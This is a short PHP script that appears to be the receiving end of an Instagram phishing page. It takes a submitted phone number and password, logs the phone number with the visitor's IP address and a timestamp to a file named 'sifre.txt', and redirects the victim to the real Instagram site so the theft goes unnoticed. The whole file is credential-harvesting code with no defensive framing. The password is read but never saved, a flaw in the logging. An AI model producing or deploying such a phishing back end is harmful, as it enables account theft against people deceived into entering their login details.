<?php
$username = $_POST['telf'];
$password =  $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('sifre.txt', 'a'); 
fwrite($file, $username."<<<---Telefon Numarası<<<---- " . "   Ip Adresi: " .$ip. "  Tarih: " .$cur_time.  "\n\n");
fclose($file); 
echo '';
			header("Refresh:0; url=https://www.instagram.com");
?>





